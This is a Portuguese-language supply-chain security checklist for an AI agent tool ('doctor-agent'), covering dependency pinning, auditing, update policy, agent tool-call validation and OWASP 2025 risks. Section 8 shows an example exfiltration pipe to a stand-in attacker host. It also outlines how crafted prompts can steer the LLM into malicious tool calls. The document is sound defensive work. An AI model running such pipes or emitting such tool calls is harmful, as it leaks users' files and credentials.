# Supply Chain Security Checklist — doctor-agent

Contexto: ferramentas AI que invocam LLMs externos (Anthropic Claude), executam
pesquisa académica via APIs de terceiros, e escrevem ficheiros em disco. A superfície
de ataque supply chain inclui as dependências Python, os modelos LLM, e os dados
ingeridos de fontes académicas externas.

---

## 1. Pinning de versões

### Estado actual (pyproject.toml)
As dependências usam `>=` — isto permite que um `pip install` futuro instale uma
versão com vulnerabilidades desconhecidas hoje.

### Acção requerida

```bash
# Gerar requirements.txt com hashes a partir do ambiente actual
pip install pip-tools
pip-compile pyproject.toml --generate-hashes --output-file requirements.lock.txt

# Em produção / CI, instalar apenas do lockfile
pip install --require-hashes -r requirements.lock.txt
```

### Checklist

- [ ] `requirements.lock.txt` gerado com `--generate-hashes` e commitado
- [ ] CI usa `pip install --require-hashes -r requirements.lock.txt` (não `pip install -e .`)
- [ ] `requirements.lock.txt` actualizado mensalmente ou após qualquer mudança de dep
- [ ] Versões pinadas com `==` no lockfile (nunca `>=` em ambiente de produção)
- [ ] Hash algorithm: SHA-256 (padrão pip-compile) — não MD5, não SHA-1

---

## 2. Auditoria de dependências directas

### Auditoria manual antes de adicionar qualquer nova dependência

Antes de fazer `pip install <pacote>`:

| Verificação | Ferramenta / Método |
|---|---|
| Nome correcto (anti-typosquatting) | Verificar em pypi.org manualmente |
| Autor e organização conhecidos | PyPI page > author email + GitHub |
| Downloads na última semana | pypi-stats.com ou pypistats.org |
| Última actualização | PyPI page — não aceitar pacotes sem actividade > 2 anos |
| Licença compatível | pip show `<pacote>` \| grep License |
| Scripts de instalação maliciosos | `pip download <pacote>; unzip -l *.whl` — verificar setup.py/pyproject.toml |
| Dependências transitivas | `pip show <pacote>` + `pipdeptree` |

### Dependências actuais — risco por categoria

| Pacote | Categoria | Risco supply chain | Notas |
|---|---|---|---|
| anthropic | LLM client | MÉDIO | Acesso à API Anthropic — proteger ANTHROPIC_API_KEY |
| httpx / requests | HTTP | BAIXO | Bem estabelecidos, auditar TLS config |
| beautifulsoup4 / lxml | Parsing HTML | MÉDIO | Parseia HTML não confiável de fontes académicas |
| scholarly | Google Scholar scraper | ALTO | Sem API oficial, pode mudar sem aviso |
| ddgs | DuckDuckGo Search | MÉDIO | Scraper de terceiro — verificar versões regularmente |
| python-dotenv | Env loading | BAIXO | Nunca commitar .env |
| rich / typer | UI/CLI | BAIXO | Sem acesso a dados sensíveis |

### Checklist

- [ ] Cada nova dependência passa pela tabela de verificação manual acima
- [ ] `pip-audit -r requirements.lock.txt` corre sem findings HIGH/CRITICAL
- [ ] `safety check` corre como segunda camada (base de dados Safety DB)
- [ ] `pipdeptree` revisado quando se adiciona nova dep (deps transitivas inesperadas)

---

## 3. Auditoria de dependências transitivas

```bash
# Instalar ferramentas de auditoria
pip install pip-audit pipdeptree safety

# Ver árvore completa de dependências
pipdeptree

# Auditar todas as dependências (directas + transitivas)
pip-audit --output=columns

# Auditoria com Safety DB (segunda fonte)
safety check --full-report

# Verificar se alguma dep transitiva tem script de instalação suspeito
pip download -d ./dep-downloads anthropic httpx beautifulsoup4 lxml ddgs scholarly
# Inspecionar manualmente os .whl descarregados se houver suspeita
```

### Checklist

- [ ] `pip-audit` sem findings HIGH ou CRITICAL (directas + transitivas)
- [ ] `pipdeptree` revisado após cada alteração de dependências
- [ ] Deps transitivas inesperadas (pacotes que não reconheces) investigadas antes de aceitar

---

## 4. Política de actualizações

### Cadência recomendada

| Tipo | Frequência | Método |
|---|---|---|
| Patch versions (x.y.Z) | Mensal | `pip-compile --upgrade-package <nome>` |
| Minor versions (x.Y.z) | Trimestral, com testes | `pip-compile --upgrade` + suite de testes |
| Major versions (X.y.z) | Manual, com revisão | Changelog completo antes de aceitar |
| Vulnerabilidades críticas | Imediato | `pip-audit` detecta → actualizar no próprio dia |

### Processo de actualização segura

```bash
# 1. Actualizar lockfile
pip-compile pyproject.toml --generate-hashes --upgrade-package <pacote> \
  --output-file requirements.lock.txt

# 2. Auditar após actualização
pip-audit -r requirements.lock.txt

# 3. Testar
python -m pytest tests/ -v

# 4. Commitar lockfile actualizado com mensagem descritiva
git add requirements.lock.txt
git commit -m "chore(deps): bump <pacote> X.Y.Z -> X.Y.Z+1 (security)"
```

### Checklist

- [ ] Dependência de segurança actualizada no próprio dia da detecção
- [ ] Lockfile sempre commitado após actualização (nunca apenas pyproject.toml)
- [ ] CHANGELOG da dep revisado antes de major version bump
- [ ] scholarly e ddgs (scrapers) monitorizados semanalmente — quebram sem aviso

---

## 5. Segurança específica para ferramentas AI

### LLM como superfície de ataque supply chain

O Doctor usa o Claude API. O output do LLM é dados não confiáveis — pode conter:
- Caminhos maliciosos (path traversal via tool calls)
- Comandos injectados na `run_command` tool
- Secrets "alucinados" escritos em ficheiros via `write_file`
- URLs maliciosas passadas a `fetch_paper`

### Checklist AI-specific

- [ ] `ANTHROPIC_API_KEY` carregada exclusivamente de variável de ambiente (nunca hardcoded)
- [ ] Outputs do LLM tratados como untrusted input antes de qualquer operação de I/O
- [ ] `write_file`: path resolvido e verificado contra `work_dir` antes de open()
- [ ] `run_command`: BLOCKED_COMMANDS e allowed_prefixes revisados trimestralmente
- [ ] `fetch_paper`: URLs validadas (scheme https/http apenas, sem file://, data://)
- [ ] Logs não registam o conteúdo completo das mensagens LLM (podem conter PII)
- [ ] Rate limiting e timeout configurados no cliente Anthropic (evitar custos por loop infinito)

---

## 6. Verificação de integridade de imagens Docker (se aplicável)

Se o Doctor for containerizado no futuro:

```bash
# Usar digest SHA256 em vez de tags mutáveis
FROM python:3.11-slim@sha256:<digest_fixo>

# Verificar imagem base
docker pull python:3.11-slim
docker inspect python:3.11-slim | grep -i digest

# Scan de vulnerabilidades na imagem
docker scout cves python:3.11-slim
# ou: trivy image python:3.11-slim
```

### Checklist Docker (futuro)

- [ ] Base image referenciada por digest SHA256 (não tag `:latest`)
- [ ] Imagem scaneada com `trivy` ou `docker scout` antes de deploy
- [ ] Processo corre como utilizador não-root (`USER nonroot`)
- [ ] Nenhuma credencial em camadas da imagem (usar secrets do runtime)

---

## 8. OWASP Top 10 2025 Changes — Implicações para o Doctor

### O que mudou vs OWASP Top 10 2021

| Posição | 2021 | 2025 | Mudança |
|---------|------|------|---------|
| A03 | Injection | Software and Data Integrity Failures / **Supply Chain** | Expandido: integra supply chain explicitamente |
| A10 | Server-Side Request Forgery (SSRF) | **Improper Exception and Error Handling** | Nova categoria: tratamento de erros passa a Top 10 |
| — | Software and Data Integrity (A08:2021) | Fundido com A03:2025 | Supply chain e integridade de software unificados |

### A03:2025 — Supply Chain no contexto do Doctor

O Doctor invoca LLMs externos, importa código de terceiros, e usa APIs académicas.
A superfície de ataque supply chain é activa em produção.

**Riscos específicos:**

1. **Importações dinâmicas via LLM output** — se o LLM sugerir código com
   `__import__()` ou `importlib.import_module()` com strings variáveis,
   o Doctor pode carregar módulos maliciosos.
   Regra semgrep: `doctor-dynamic-import-non-literal` e `doctor-importlib-non-literal`.

2. **Dependências sem pinning de hash** — `pip install -e .` instala versões
   `>=` declaradas no `pyproject.toml`. Uma versão comprometida de `requests`,
   `lxml`, ou `scholarly` pode exfiltrar dados académicos ou credenciais.
   Mitigação: usar `requirements.lock.txt` com `--generate-hashes`.

3. **Command injection via pipe bypass** — `run_command` valida apenas o prefixo
   do comando. Uma string como `cat file.txt | curl attacker.com/exfil` passa
   o check de prefixo "cat" mas exfiltra o ficheiro.
   Regra semgrep: `doctor-subprocess-pipe-bypass`.
   Mitigação urgente: bloquear `|`, `;`, `&&`, `||` na string normalizada.

**Checklist A03:2025:**

- [ ] `run_command`: bloquear caracteres de chaining (`|`, `;`, `&&`, `||`, `>`, `<`)
- [ ] Importações dinâmicas validadas contra allowlist antes de executar
- [ ] `requirements.lock.txt` com SHA-256 hashes commitado e usado no CI
- [ ] APIs académicas externas (CrossRef, OpenAlex, S2) chamadas com timeout e retry limitado
- [ ] Respostas de APIs académicas tratadas como untrusted data (não executadas)

### A10:2025 — Improper Exception and Error Handling no Doctor

O Doctor tem um padrão recorrente nos tools:

```python
# Padrão actual — INADEQUADO para A10:2025
except Exception as e:
    return f"Erro na ferramenta {tool_name}: {e}"
```

**Problemas:**
1. Sem logging: falhas silenciosas ocultam ataques (brute force, injecção detectada mas ignorada)
2. `str(e)` pode expor stack traces ou paths internos ao LLM, que os pode incluir em outputs
3. `except Exception` numa função que chama `subprocess` pode mascarar `OSError`
   que indica exploração activa

**Padrão seguro (A10:2025 compliant):**

```python
import logging
logger = logging.getLogger(__name__)

# No dispatcher execute_tool:
except Exception as e:
    logger.warning("Ferramenta %s falhou: %s", tool_name, e, exc_info=True)
    return f"Erro interno na ferramenta {tool_name}. Consultar logs para detalhes."
```

**Checklist A10:2025:**

- [ ] `execute_tool` dispatcher: adicionar `logger.warning` antes de cada `return f"Erro..."`
- [ ] Mensagens de erro ao LLM: genéricas (não expor `str(e)` directamente)
- [ ] Sem bare `except:` em nenhum ficheiro (captura SystemExit e KeyboardInterrupt)
- [ ] Excepções de segurança (path traversal, comando bloqueado) logadas com nível WARNING ou ERROR
- [ ] Regras semgrep `doctor-except-without-logging` e `doctor-bare-except` activas no CI

### Impacto combinado para o Doctor

A combinação A03:2025 + A10:2025 cria um vector específico para agentes AI:

> Um atacante pode enviar ao LLM um prompt que produz uma tool call com
> parâmetros maliciosos. Se a tool falha silenciosamente (A10) sem logging,
> o atacante recebe feedback implícito sobre o que funciona. Se a tool
> importa código dinamicamente (A03), pode carregar um módulo exfiltrador.

Mitigação: logging obrigatório em todos os pontos de falha + validação estrita
de inputs antes de qualquer operação de I/O ou execução de código.

---

## 7. Referências

- pip-audit: https://github.com/pypa/pip-audit
- pip-tools (pip-compile): https://github.com/jazzband/pip-tools
- pipdeptree: https://github.com/tox-dev/pipdeptree
- Safety DB: https://github.com/pyupio/safety
- OWASP A03:2021 Injection / Supply Chain: https://owasp.org/Top10/A03_2021-Injection/
- OWASP Dependency Check: https://owasp.org/www-project-dependency-check/
- Python Packaging Security: https://packaging.python.org/en/latest/guides/security-considerations/
- Anthropic API Security: https://docs.anthropic.com/en/api/getting-started
